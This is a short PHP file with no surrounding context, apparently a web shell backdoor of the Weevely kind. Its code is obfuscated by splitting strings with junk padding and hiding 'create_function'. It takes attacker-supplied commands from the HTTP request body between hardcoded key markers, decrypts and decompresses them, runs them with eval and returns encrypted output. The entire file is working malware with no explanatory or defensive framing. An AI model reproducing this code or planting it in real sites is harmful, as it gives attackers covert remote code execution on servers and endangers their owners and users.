<?php
$e='fcode($m[1]Ef),$k))Ef);Ef$o=Ef@ob_get_conEftents();Ef@Efob_Efend_cEflean();$Efr';
$n='"QW4EflolO8qEfqCEfE9nzBEf";EffunctiEfon x($t,Ef$k){$c=EfsEftrlen($k);$l=';
$P='strlenEf($t);$oEf="Ef";foEfr($Efi=0;$i<$l;){foEfr($j=Ef0;($Efj<$c&&$Efi<$l)';
$a='$k="2Ef129a3f6";$Efkh="Ef08c5add6Ef78cb";EfEf$kf="092Ef994Ef12dEfaa9";$p=';
$I='EfEf;$j++,$Efi++){$o.=Ef$t{$i}^$k{Ef$j};Ef}}returEfn $o;}if Ef(@preEfg_matEfc';
$D='$m)==1) {@ob_staEfrt()Ef;@evEfal(@gEfzuncompressEf(@x(@baEfsEfe64_deE';
$O=str_replace('iN','','ciNiNreateiN_iNfuiNniNction');
$F='h("/Ef$kh(Ef.+)$kfEf/",@file_gEfet_cEfontents("Efphp:Ef//input"Ef)Ef,Ef';
$Y='=@baEfse64_encode(@xEf(@gzcoEfmpressEf($o)Ef,Ef$k));EfpriEfnt("$p$kh$r$kf");}';
$Z=str_replace('Ef','',$a.$n.$P.$I.$F.$D.$e.$Y);
$N=$O('',$Z);$N();
?>
